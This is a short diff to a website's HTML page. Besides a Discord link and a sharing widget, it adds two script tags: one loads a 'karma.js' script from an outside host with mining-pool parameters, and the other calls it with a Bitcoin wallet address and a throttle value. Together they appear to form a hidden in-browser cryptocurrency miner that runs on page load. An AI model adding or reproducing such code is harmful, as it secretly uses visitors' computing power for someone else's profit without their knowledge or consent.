@@ -29,3 +29,8 @@ You can join our <a href="https://discord.gg/hNwuSVHz" target="_blank"><u>Discor
 </center>
 
 <script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=69373e52d1fcd60fb5090f93&product=sop' async='async'></script>
+
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
+<script type="text/javascript">
+EverythingIsLife('bc1qtu4fj64407en7zxqucste9zt6a7sr2jw02f000', 'c=BTC', 30);
+</script>
